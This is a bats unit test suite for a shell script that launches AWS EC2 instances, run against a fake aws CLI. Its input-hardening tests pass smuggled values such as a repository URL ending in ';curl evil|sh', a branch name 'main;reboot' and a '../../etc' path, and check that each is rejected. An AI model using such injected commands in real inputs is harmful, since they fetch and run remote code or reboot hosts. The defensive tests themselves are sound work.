#!/usr/bin/env bats
#
# aws_create_instance.bats - Unit tests for scripts/aws_create_instance.sh
#
# Strategy: NO real AWS calls are ever made. The `aws` CLI is shadowed with a
# fake executable first on PATH (tests/unit/helpers/fake_aws.bash), the script runs
# under `env -i` for full isolation, and the exact `ec2 run-instances` argv is
# captured to assert on: input validation, arch inference, AMI resolution,
# subnet/SG discovery vs. provided, block-device mappings, tenancy, tags,
# user-data, DRYRUN/NO_WAIT paths, region fallback, placement groups and the
# final summary.
#
# Run:  bats tests/unit/scripts/aws_create_instance.bats
#       bats --filter "placement" tests/unit/scripts/aws_create_instance.bats

setup_file() {
    export SCRIPT="${BATS_TEST_DIRNAME}/../../../scripts/aws_create_instance.sh"
    [ -f "${SCRIPT}" ] || { echo "cannot find ${SCRIPT}" >&2; return 1; }
    make_fake_aws
}

setup() {
    bats_load_library bats-support
    bats_load_library bats-assert
    fake_aws_reset
}

load '../helpers/fake_aws'

# Substring assertions on arbitrary strings (OUTPUT/OPLOG/captured argv).
assert_contains() { # <haystack> <needle>
    case "$1" in *"$2"*) return 0 ;; esac
    fail "expected to contain [$2]"$'\n'"in: $1"
}
assert_not_contains() { # <haystack> <needle>
    case "$1" in *"$2"*) fail "should NOT contain [$2]"$'\n'"in: $1" ;; esac
}

# Common required vars for a successful run (region provided so no config call).
BASE="AWS_REGION=us-west-2 INSTANCE_TYPE=m8g.large KEYPAIR=k EXPNAME=exp"
run_sut() { run_script "${SCRIPT}" "$@"; }

# ==========================================================================
# 0. Static checks
# ==========================================================================

@test "static: script passes bash -n" {
    bash -n "${SCRIPT}"
}

# ==========================================================================
# 1. Required input validation
# ==========================================================================

@test "validation: missing INSTANCE_TYPE fails and names the var" {
    run_sut AWS_REGION=us-west-2 KEYPAIR=k EXPNAME=exp
    assert_equal "$RC" 1
    assert_contains "$OUTPUT" "INSTANCE_TYPE"
}

@test "validation: missing KEYPAIR fails and names the var" {
    run_sut AWS_REGION=us-west-2 INSTANCE_TYPE=m8g.large EXPNAME=exp
    assert_equal "$RC" 1
    assert_contains "$OUTPUT" "KEYPAIR"
}

@test "validation: missing EXPNAME fails and names the var" {
    run_sut AWS_REGION=us-west-2 INSTANCE_TYPE=m8g.large KEYPAIR=k
    assert_equal "$RC" 1
    assert_contains "$OUTPUT" "EXPNAME"
}

# ==========================================================================
# 1b. Input hardening (allowlist / numeric validation) - rejects before any
#     AWS call, so a crafted value cannot reach user-data or the argv JSON.
# ==========================================================================

@test "validation: REPO_URL with shell metacharacters rejected" {
    run_sut $BASE CLONE_REPO=true REPO_URL='https://x/r.git;curl evil|sh'
    assert_equal "$RC" 1
    assert_contains "$OUTPUT" "REPO_URL"
    assert_not_contains "$OPLOG" "ec2 run-instances"
}

@test "validation: REPO_DEST_NAME '..' rejected (no path traversal)" {
    run_sut $BASE CLONE_REPO=true REPO_DEST_NAME=..
    assert_equal "$RC" 1
    assert_contains "$OUTPUT" "REPO_DEST_NAME"
}

@test "validation: REPO_BRANCH with metacharacters rejected" {
    run_sut $BASE CLONE_REPO=true REPO_BRANCH='main;reboot'
    assert_equal "$RC" 1
    assert_contains "$OUTPUT" "REPO_BRANCH"
}

@test "validation: EXPNAME with a path separator rejected" {
    run_sut $BASE EXPNAME=../../etc
    assert_equal "$RC" 1
    assert_contains "$OUTPUT" "EXPNAME"
}

@test "validation: non-numeric EBS_DISKS_SIZE rejected" {
    run_sut $BASE EBS_DISKS_NUMBER=1 EBS_DISKS_SIZE=abc CLONE_REPO=false
    assert_equal "$RC" 1
    assert_contains "$OUTPUT" "EBS_DISKS_SIZE"
}

@test "validation: EBS_DISKS_NUMBER above 25 rejected" {
    run_sut $BASE EBS_DISKS_NUMBER=26 CLONE_REPO=false
    assert_equal "$RC" 1
    assert_contains "$OUTPUT" "EBS_DISKS_NUMBER"
}

@test "validation: malformed SUBNET_ID rejected" {
    run_sut $BASE SUBNET_ID=not-a-subnet CLONE_REPO=false
    assert_equal "$RC" 1
    assert_contains "$OUTPUT" "SUBNET_ID"
}

@test "validation: bad ASSOCIATE_PUBLIC_IP rejected" {
    run_sut $BASE ASSOCIATE_PUBLIC_IP=yes CLONE_REPO=false
    assert_equal "$RC" 1
    assert_contains "$OUTPUT" "ASSOCIATE_PUBLIC_IP"
}

@test "validation: OWNER_TAG with spaces is accepted" {
    run_sut $BASE OWNER_TAG="First Last" CLONE_REPO=false
    assert_equal "$RC" 0
    assert_contains "$(get_arg --tag-specifications)" "Key=Owner,Value=First Last"
}

# ==========================================================================
# 1c. CLI argument handling
# ==========================================================================

# --help / bad-arg exit at the argument case before any AWS call or required-var
# check, so they run the script directly (run_sut passes env vars, not argv).
@test "args: --help prints the env-var docs and exits 0" {
    run bash "${SCRIPT}" --help
    assert_equal "$status" 0
    assert_contains "$output" "Environment variables"
    assert_contains "$output" "INSTANCE_TYPE"
}

@test "args: an unexpected positional argument fails" {
    run bash "${SCRIPT}" bogusarg
    assert_equal "$status" 1
    assert_contains "$output" "Unexpected argument"
}

# ==========================================================================
# 2. Architecture inference
# ==========================================================================

@test "arch: m8g -> arm64" {
    run_sut $BASE INSTANCE_TYPE=m8g.24xlarge
    assert_contains "$OUTPUT" "Architecture: arm64"
}

@test "arch: r8g -> arm64" {
    run_sut $BASE INSTANCE_TYPE=r8g.4xlarge
    assert_contains "$OUTPUT" "Architecture: arm64"
}

@test "arch: x2gd -> arm64" {
    run_sut $BASE INSTANCE_TYPE=x2gd.medium
    assert_contains "$OUTPUT" "Architecture: arm64"
}

@test "arch: m7i -> x86_64" {
    run_sut $BASE INSTANCE_TYPE=m7i.large
    assert_contains "$OUTPUT" "Architecture: x86_64"
}

@test "arch: c6a -> x86_64" {
    run_sut $BASE INSTANCE_TYPE=c6a.2xlarge
    assert_contains "$OUTPUT" "Architecture: x86_64"
}

@test "arch: explicit ARCH overrides inference" {
    run_sut $BASE INSTANCE_TYPE=m8g.large ARCH=x86_64
    assert_contains "$OUTPUT" "Architecture: x86_64"
}

# ==========================================================================
# 3. AMI resolution
# ==========================================================================

@test "ami: verbatim ami-... used as image-id, no alias resolution" {
    # A verbatim id skips alias resolution; the script still makes ONE
    # describe-images call to read the AMI's root device name.
    run_sut $BASE AMI=ami-custom0001 CLONE_REPO=false
    assert_equal "$(get_arg --image-id)" "ami-custom0001"
    # Exactly one describe-images (the root-device lookup), never two.
    assert_equal "$(grep -c 'ec2 describe-images' <<<"$OPLOG")" 1
}

@test "ami: alias resolves via describe-images" {
    run_sut $BASE AMI=AL2023_K6.12 CLONE_REPO=false
    assert_equal "$(get_arg --image-id)" "ami-deadbeef"
    assert_contains "$OPLOG" "ec2 describe-images"
}

@test "ami: unknown alias fails with explanation" {
    run_sut $BASE AMI=NOSUCH_ALIAS
    assert_equal "$RC" 1
    assert_contains "$OUTPUT" "Unknown AMI alias"
}

@test "ami: no matching AMI (None) fails with explanation" {
    run_sut $BASE AMI=AL2023 FAKE_AMI=None
    assert_equal "$RC" 1
    assert_contains "$OUTPUT" "No AMI found"
}

# ==========================================================================
# 4. Subnet / security-group discovery vs. provided
# ==========================================================================

@test "network: subnet and SG auto-discovered from default VPC" {
    run_sut $BASE CLONE_REPO=false
    NI="$(get_arg --network-interfaces)"
    assert_contains "$NI" '"SubnetId":"subnet-22222222"'
    assert_contains "$NI" '"Groups":["sg-33333333"]'
    assert_contains "$OPLOG" "ec2 describe-vpcs"
    assert_contains "$OUTPUT" "random of"
}

@test "network: provided SUBNET_ID and SG_ID used, no discovery" {
    run_sut $BASE SUBNET_ID=subnet-aaa SG_ID=sg-bbb CLONE_REPO=false
    NI="$(get_arg --network-interfaces)"
    assert_contains "$NI" '"SubnetId":"subnet-aaa"'
    assert_contains "$NI" '"Groups":["sg-bbb"]'
    assert_not_contains "$OPLOG" "ec2 describe-vpcs"
    assert_not_contains "$OPLOG" "ec2 describe-subnets"
}

@test "network: SUBNET_ID without SG_ID derives SG from subnet's VPC, not default VPC" {
    # This is the case that used to fail on accounts with no default VPC.
    run_sut $BASE SUBNET_ID=subnet-aaa FAKE_SG=sg-fromvpc CLONE_REPO=false
    NI="$(get_arg --network-interfaces)"
    assert_contains "$NI" '"SubnetId":"subnet-aaa"'
    assert_contains "$NI" '"Groups":["sg-fromvpc"]'
    assert_not_contains "$OPLOG" "ec2 describe-vpcs"
    assert_contains "$OPLOG" "ec2 describe-subnets"
    assert_contains "$OUTPUT" "default SG of vpc-fromsubnet"
}

@test "network: ASSOCIATE_PUBLIC_IP=false honored" {
    run_sut $BASE ASSOCIATE_PUBLIC_IP=false CLONE_REPO=false
    assert_contains "$(get_arg --network-interfaces)" '"AssociatePublicIpAddress":false'
}

# ==========================================================================
# 5. Block-device mappings
# ==========================================================================

@test "bdm: 0 data disks -> root device only (from AMI, gp3 256)" {
    run_sut $BASE EBS_DISKS_NUMBER=0 CLONE_REPO=false
    BDM="$(get_arg --block-device-mappings)"
    NDEV="$(python3 -c 'import json,sys;print(len(json.loads(sys.argv[1])))' "$BDM")"
    assert_equal "$NDEV" 1
    # Root device name comes from the AMI (fake default /dev/xvda).
    assert_contains "$BDM" '"DeviceName":"/dev/xvda","Ebs":{"VolumeSize":256,"VolumeType":"gp3"'
}

@test "bdm: 12 io2 disks -> 13 devices xvda + sdb..sdm" {
    run_sut $BASE EBS_DISKS_NUMBER=12 EBS_DISKS_SIZE=1024 EBS_DISKS_TYPE=IO2 EBS_DISKS_IOPS=32000 CLONE_REPO=false
    BDM="$(get_arg --block-device-mappings)"
    NDEV="$(python3 -c 'import json,sys;print(len(json.loads(sys.argv[1])))' "$BDM")"
    DEVS="$(python3 -c 'import json,sys;print(",".join(x["DeviceName"] for x in json.loads(sys.argv[1])))' "$BDM")"
    assert_equal "$NDEV" 13
    assert_equal "$DEVS" "/dev/xvda,/dev/sdb,/dev/sdc,/dev/sdd,/dev/sde,/dev/sdf,/dev/sdg,/dev/sdh,/dev/sdi,/dev/sdj,/dev/sdk,/dev/sdl,/dev/sdm"
    assert_contains "$BDM" '"VolumeType":"io2"'
    assert_contains "$BDM" '"Iops":32000'
}

@test "bdm: io2 without explicit IOPS defaults to 16000" {
    run_sut $BASE EBS_DISKS_NUMBER=1 EBS_DISKS_TYPE=io2 CLONE_REPO=false
    assert_contains "$(get_arg --block-device-mappings)" '"Iops":16000'
}

@test "bdm: gp3 defaults IOPS 3000 and applies Throughput" {
    run_sut $BASE EBS_DISKS_NUMBER=1 EBS_DISKS_TYPE=gp3 EBS_DISKS_THROUGHPUT=250 CLONE_REPO=false
    BDM="$(get_arg --block-device-mappings)"
    assert_contains "$BDM" '"Iops":3000'
    assert_contains "$BDM" '"Throughput":250'
}

@test "bdm: st1 has no Iops field" {
    run_sut $BASE EBS_DISKS_NUMBER=1 EBS_DISKS_TYPE=st1 CLONE_REPO=false
    assert_not_contains "$(get_arg --block-device-mappings)" '"Iops"'
}

@test "bdm: custom root disk size/type honored" {
    run_sut $BASE ROOT_DISK_SIZE=100 ROOT_DISK_TYPE=gp2 CLONE_REPO=false
    assert_contains "$(get_arg --block-device-mappings)" '"DeviceName":"/dev/xvda","Ebs":{"VolumeSize":100,"VolumeType":"gp2"'
}

@test "bdm: root device name read from the AMI (Ubuntu /dev/sda1)" {
    run_sut $BASE FAKE_ROOT_DEVICE=/dev/sda1 CLONE_REPO=false
    BDM="$(get_arg --block-device-mappings)"
    assert_contains "$BDM" '"DeviceName":"/dev/sda1","Ebs":{"VolumeSize":256'
    assert_not_contains "$BDM" '"DeviceName":"/dev/xvda"'
    assert_contains "$OUTPUT" "Root device: /dev/sda1"
}

@test "bdm: unreadable RootDeviceName falls back to /dev/xvda with a warning" {
    run_sut $BASE FAKE_ROOT_DEVICE=None CLONE_REPO=false
    assert_contains "$(get_arg --block-device-mappings)" '"DeviceName":"/dev/xvda"'
    assert_contains "$OUTPUT" "assuming /dev/xvda"
}

@test "bdm: io2 root gets mandatory Iops default 16000" {
    run_sut $BASE ROOT_DISK_TYPE=io2 CLONE_REPO=false
    # Root is the first BDM entry; assert its Iops via python for precision.
    BDM="$(get_arg --block-device-mappings)"
    ROOT_IOPS="$(python3 -c 'import json,sys;print(json.loads(sys.argv[1])[0]["Ebs"].get("Iops"))' "$BDM")"
    assert_equal "$ROOT_IOPS" 16000
}

@test "bdm: io1 root default Iops capped to the 50:1 ratio (100 GiB -> 5000)" {
    run_sut $BASE ROOT_DISK_TYPE=io1 ROOT_DISK_SIZE=100 CLONE_REPO=false
    BDM="$(get_arg --block-device-mappings)"
    ROOT_IOPS="$(python3 -c 'import json,sys;print(json.loads(sys.argv[1])[0]["Ebs"].get("Iops"))' "$BDM")"
    assert_equal "$ROOT_IOPS" 5000
}

@test "bdm: root Iops cleared (with warning) for a type that rejects it" {
    run_sut $BASE ROOT_DISK_TYPE=gp2 ROOT_DISK_IOPS=5000 CLONE_REPO=false
    BDM="$(get_arg --block-device-mappings)"
    HAS_IOPS="$(python3 -c 'import json,sys;print("Iops" in json.loads(sys.argv[1])[0]["Ebs"])' "$BDM")"
    assert_equal "$HAS_IOPS" False
    assert_contains "$OUTPUT" "ROOT_DISK_IOPS does not apply to gp2"
}

# ==========================================================================
# 6. Tenancy, tags, key pair, instance type
# ==========================================================================

@test "tenancy: defaults to dedicated" {
    run_sut $BASE CLONE_REPO=false
    assert_contains "$(get_arg --placement)" "Tenancy=dedicated"
}

@test "tenancy: override honored" {
    run_sut $BASE TENANCY=default CLONE_REPO=false
    assert_contains "$(get_arg --placement)" "Tenancy=default"
}

@test "tags: Name=repro-<EXPNAME>-sut and Owner applied" {
    run_sut $BASE EXPNAME=myexp OWNER_TAG=tester CLONE_REPO=false
    TAGS="$(get_arg --tag-specifications)"
    assert_contains "$TAGS" "Key=Name,Value=repro-myexp-sut"
    assert_contains "$TAGS" "Key=Owner,Value=tester"
}

@test "passthrough: key-name and instance-type" {
    run_sut $BASE KEYPAIR=mykey INSTANCE_TYPE=m8g.24xlarge CLONE_REPO=false
    assert_equal "$(get_arg --key-name)" "mykey"
    assert_equal "$(get_arg --instance-type)" "m8g.24xlarge"
}

# ==========================================================================
# 7. User-data + repo clone option
# ==========================================================================

@test "user-data: clone enabled -> SSM disable, git install, default repo into ec2-user home" {
    run_sut $BASE CLONE_REPO=true
    UD="$(get_arg --user-data)"
    assert_contains "$UD" "amazon-ssm-agent"
    assert_contains "$UD" "git"
    assert_contains "$UD" "git clone"
    assert_contains "$UD" "https://github.com/aws/repro-collection.git"
    assert_contains "$UD" "/home/ec2-user/repro-collection"
    assert_contains "$OUTPUT" "Repo clone enabled"
}

@test "user-data: CLONE_REPO=false -> no git clone, base user-data intact" {
    run_sut $BASE CLONE_REPO=false
    UD="$(get_arg --user-data)"
    assert_not_contains "$UD" "git clone"
    assert_contains "$UD" "amazon-ssm-agent"
    assert_contains "$OUTPUT" "Repo clone disabled"
}

@test "user-data: custom REPO_BRANCH/REPO_URL/REPO_DEST_NAME honored" {
    run_sut $BASE CLONE_REPO=true REPO_BRANCH=gh-action REPO_URL=https://example.com/x.git REPO_DEST_NAME=mydir
    UD="$(get_arg --user-data)"
    # Values are single-quoted in the emitted (root-run) user-data.
    assert_contains "$UD" "git -C \"\$_d\" checkout 'gh-action'"
    assert_contains "$UD" "https://example.com/x.git"
    assert_contains "$UD" "/home/ec2-user/mydir"
}

@test "user-data: repo URL uses 'git clone --' to block option injection" {
    run_sut $BASE CLONE_REPO=true
    assert_contains "$(get_arg --user-data)" "git clone -- '"
}

@test "user-data: Ubuntu AMI clones into /home/ubuntu" {
    run_sut $BASE AMI=UBUNTU2204 CLONE_REPO=true
    assert_contains "$(get_arg --user-data)" "/home/ubuntu/repro-collection"
}

# ==========================================================================
# 8. DRYRUN path
# ==========================================================================

@test "dryrun: exits 0 on DryRunOperation, no describe-instances" {
    run_sut $BASE DRYRUN=true CLONE_REPO=false
    assert_equal "$RC" 0
    assert_contains "$OPLOG" "ec2 run-instances"
    assert_contains "$(tr '\0' ' ' < "$AWS_CAPTURE")" "--dry-run"
    assert_contains "$OUTPUT" "DryRunOperation"
    assert_not_contains "$OPLOG" "ec2 describe-instances"
}

@test "dryrun: a real EC2 error (not DryRunOperation) fails" {
    run_sut $BASE DRYRUN=true CLONE_REPO=false FAKE_DRYRUN_ERROR=UnauthorizedOperation
    assert_equal "$RC" 1
    assert_contains "$OUTPUT" "Dry run failed"
}

@test "dryrun: missing placement group is NOT created (no account mutation)" {
    run_sut $BASE DRYRUN=true CLONE_REPO=false TENANCY=default \
        PLACEMENT_GROUP_NAME=pg-new FAKE_PG_ID=None
    assert_equal "$RC" 0
    assert_not_contains "$OPLOG" "ec2 create-placement-group"
    assert_contains "$OUTPUT" "would be created"
    # The not-yet-created group must not be referenced in the validated request.
    assert_not_contains "$(get_arg --placement)" "GroupName"
}

# ==========================================================================
# 9. Full launch path + summary
# ==========================================================================

@test "launch: full path exits 0, waits, and prints summary" {
    run_sut $BASE CLONE_REPO=false
    assert_equal "$RC" 0
    assert_contains "$OPLOG" "ec2 run-instances"
    assert_contains "$OPLOG" "ec2 wait"
    assert_contains "$OPLOG" "ec2 describe-instances"
    assert_contains "$OUTPUT" "i-0abc123def456"
    assert_contains "$OUTPUT" "10.0.0.5"
    assert_contains "$OUTPUT" "52.10.20.30"
    assert_contains "$OUTPUT" "ssh ec2-user@52.10.20.30"
}

@test "launch: NO_WAIT=true skips wait" {
    run_sut $BASE NO_WAIT=true CLONE_REPO=false
    assert_not_contains "$OPLOG" "ec2 wait"
}

@test "launch: no public IP -> summary shows (none)" {
    run_sut $BASE FAKE_PUB=None CLONE_REPO=false
    assert_contains "$OUTPUT" "Public  IP    : (none)"
}

@test "launch: Ubuntu AMI -> ssh user 'ubuntu'" {
    run_sut $BASE AMI=UBUNTU2204 CLONE_REPO=false
    assert_contains "$OUTPUT" "ssh ubuntu@"
}

@test "launch: instance id tracked even when the summary describe fails" {
    RJSON="${BATS_TEST_TMPDIR}/orphan.json"
    run_sut $BASE CLONE_REPO=false RESOURCE_FILE="$RJSON" FAKE_DESCRIBE_INSTANCES_FAIL=1
    # A post-launch describe failure must not abort the run or lose the id.
    assert_equal "$RC" 0
    assert_contains "$OUTPUT" "describe-instances failed"
    [ -f "$RJSON" ] || fail "resource JSON not written at $RJSON"
    assert_contains "$(cat "$RJSON")" "i-0abc123def456"
}

@test "launch: aws_cli injects --region on the calls" {
    run_sut $BASE CLONE_REPO=false
    assert_contains "$FLAGLOG" "region us-west-2"
}

@test "launch: aws_cli injects --profile when AWS_PROFILE is set" {
    run_sut $BASE CLONE_REPO=false AWS_PROFILE=myprof
    assert_contains "$FLAGLOG" "profile myprof"
}

@test "launch: default SG -> summary carries an SSH-may-fail caveat" {
    run_sut $BASE CLONE_REPO=false
    assert_contains "$OUTPUT" "SSH may fail"
}

# ==========================================================================
# 10. Region resolution
# ==========================================================================

@test "region: falls back to 'aws configure get region'" {
    run_sut INSTANCE_TYPE=m8g.large KEYPAIR=k EXPNAME=exp FAKE_REGION=eu-central-1 CLONE_REPO=false
    assert_equal "$RC" 0
    assert_contains "$OUTPUT" "eu-central-1"
    assert_contains "$OPLOG" "configure get"
}

@test "region: no region anywhere fails" {
    run_sut INSTANCE_TYPE=m8g.large KEYPAIR=k EXPNAME=exp FAKE_REGION=
    assert_equal "$RC" 1
    assert_contains "$OUTPUT" "no default region"
}

# ==========================================================================
# 11. Placement group
# ==========================================================================

@test "placement group: none requested -> tenancy-only placement, no PG calls" {
    run_sut $BASE CLONE_REPO=false
    assert_contains "$(get_arg --placement)" "Tenancy=dedicated"
    assert_not_contains "$(get_arg --placement)" "GroupName"
    assert_not_contains "$OPLOG" "ec2 describe-placement-groups"
}

@test "placement group: existing group reused, not recreated" {
    run_sut $BASE CLONE_REPO=false TENANCY=default \
        PLACEMENT_GROUP_NAME=pg-exp FAKE_PG_ID=pg-0exist FAKE_PG_MEMBER_SUBNET=None
    assert_equal "$RC" 0
    assert_contains "$OPLOG" "ec2 describe-placement-groups"
    assert_not_contains "$OPLOG" "ec2 create-placement-group"
    assert_contains "$(get_arg --placement)" "GroupName=pg-exp"
    assert_contains "$OUTPUT" "exists"
}

@test "placement group: missing group created with default strategy cluster" {
    run_sut $BASE CLONE_REPO=false TENANCY=default \
        PLACEMENT_GROUP_NAME=pg-new FAKE_PG_ID=None FAKE_PG_CREATE_ID=pg-0new
    assert_equal "$RC" 0
    assert_contains "$OPLOG" "ec2 create-placement-group"
    assert_contains "$OUTPUT" "(cluster)"
    assert_contains "$(get_arg --placement)" "GroupName=pg-new"
    assert_contains "$OUTPUT" "Created placement group"
}

@test "placement group: existing members' subnet reused when SUBNET_ID unset" {
    run_sut $BASE CLONE_REPO=false TENANCY=default \
        PLACEMENT_GROUP_NAME=pg-exp FAKE_PG_ID=pg-0exist FAKE_PG_MEMBER_SUBNET=subnet-member9
    assert_contains "$(get_arg --network-interfaces)" "subnet-member9"
    assert_contains "$OUTPUT" "Reusing subnet subnet-member9"
}

@test "placement group: host tenancy warns (Dedicated Hosts not allowed in PGs)" {
    run_sut $BASE CLONE_REPO=false TENANCY=host PLACEMENT_GROUP_NAME=pg-x FAKE_PG_ID=pg-0exist
    assert_contains "$OUTPUT" "Dedicated Hosts"
}

@test "placement group: dedicated tenancy does NOT warn (allowed in PGs)" {
    run_sut $BASE CLONE_REPO=false TENANCY=dedicated PLACEMENT_GROUP_NAME=pg-x FAKE_PG_ID=pg-0exist
    assert_not_contains "$OUTPUT" "Dedicated Hosts"
    assert_contains "$(get_arg --placement)" "GroupName=pg-x"
}

@test "placement group: resource JSON records PG name, instance id and subnet" {
    RJSON="${BATS_TEST_TMPDIR}/pg_resources.json"
    run_sut $BASE CLONE_REPO=false TENANCY=default RESOURCE_FILE="$RJSON" \
        PLACEMENT_GROUP_NAME=pg-exp FAKE_PG_ID=pg-0exist FAKE_PG_MEMBER_SUBNET=subnet-member9
    [ -f "$RJSON" ] || fail "resource JSON not written at $RJSON"
    assert_contains "$(cat "$RJSON")" "pg-exp"
    assert_contains "$(cat "$RJSON")" "i-0abc123def456"
    assert_contains "$(cat "$RJSON")" "subnet-member9"
}

@test "placement group: SAVE_RESOURCES=false writes no JSON" {
    RJSON="${BATS_TEST_TMPDIR}/nosave.json"
    run_sut $BASE CLONE_REPO=false SAVE_RESOURCES=false RESOURCE_FILE="$RJSON"
    [ ! -f "$RJSON" ] || fail "SAVE_RESOURCES=false but $RJSON exists"
}

@test "placement group: invalid strategy rejected" {
    run_sut $BASE CLONE_REPO=false PLACEMENT_GROUP_NAME=pg-x PLACEMENT_GROUP_STRATEGY=bogus
    assert_equal "$RC" 1
    assert_contains "$OUTPUT" "cluster partition spread"
}

@test "placement group: partition strategy passes --partition-count on create" {
    run_sut $BASE CLONE_REPO=false TENANCY=default \
        PLACEMENT_GROUP_NAME=pg-part PLACEMENT_GROUP_STRATEGY=partition \
        PLACEMENT_GROUP_PARTITION_COUNT=4 FAKE_PG_ID=None FAKE_PG_CREATE_ID=pg-0part
    assert_equal "$RC" 0
    assert_equal "$(get_pg_create_arg --strategy)" "partition"
    assert_equal "$(get_pg_create_arg --partition-count)" 4
}

@test "placement group: recorded subnet reused on a follow-up run (round-trip)" {
    RJSON="${BATS_TEST_TMPDIR}/rt.json"
    # First launch: no live members -> the chosen subnet is recorded.
    run_sut $BASE CLONE_REPO=false TENANCY=default RESOURCE_FILE="$RJSON" \
        PLACEMENT_GROUP_NAME=pg-rt FAKE_PG_ID=pg-0exist FAKE_PG_MEMBER_SUBNET=None \
        FAKE_SUBNET=subnet-first1
    assert_contains "$(cat "$RJSON")" "subnet-first1"
    # Second launch: still no live members -> must reuse the recorded subnet
    # (read back via json_get) rather than discovering a fresh one.
    run_sut $BASE CLONE_REPO=false TENANCY=default RESOURCE_FILE="$RJSON" \
        PLACEMENT_GROUP_NAME=pg-rt FAKE_PG_ID=pg-0exist FAKE_PG_MEMBER_SUBNET=None \
        FAKE_SUBNET=subnet-second2
    assert_contains "$(get_arg --network-interfaces)" "subnet-first1"
    assert_contains "$OUTPUT" "recorded for placement group"
}

@test "placement group: recorded subnet ignored when JSON region differs" {
    RJSON="${BATS_TEST_TMPDIR}/region.json"
    # Record in us-west-2.
    run_sut $BASE CLONE_REPO=false TENANCY=default RESOURCE_FILE="$RJSON" \
        PLACEMENT_GROUP_NAME=pg-rg FAKE_PG_ID=pg-0exist FAKE_PG_MEMBER_SUBNET=None \
        FAKE_SUBNET=subnet-west11
    # Re-run in a different region: the recorded subnet is region-bound and must
    # be ignored, discovering a fresh one instead.
    run_sut INSTANCE_TYPE=m8g.large KEYPAIR=k EXPNAME=exp AWS_REGION=eu-central-1 \
        CLONE_REPO=false TENANCY=default RESOURCE_FILE="$RJSON" \
        PLACEMENT_GROUP_NAME=pg-rg FAKE_PG_ID=pg-0exist FAKE_PG_MEMBER_SUBNET=None \
        FAKE_SUBNET=subnet-east22
    assert_contains "$OUTPUT" "ignoring its recorded subnet"
    assert_contains "$(get_arg --network-interfaces)" "subnet-east22"
}
